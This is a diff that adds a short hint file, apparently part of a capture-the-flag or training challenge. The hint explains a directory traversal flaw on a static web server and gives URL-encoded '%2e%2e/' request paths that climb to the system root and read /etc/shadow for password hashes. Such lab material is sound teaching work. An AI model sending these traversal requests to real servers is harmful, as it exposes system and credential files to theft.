@@ -1,0 +1,10 @@
+~/.hint2
+
+The root of this static server is located at /var/www/html/blog.
+You can retrieve sensitive files from the /etc directory.
+
+If static.twlinux.io is the tomain name, then...
+
+http://static.twlinux.io/%2e%2e/ will server /var/www/html/blog/.. --> /var/www/html.
+http://static.twlinux.io/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ resolves to / (system root directory)
+http://static.twlinux.io/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow yields encrypted passwords.
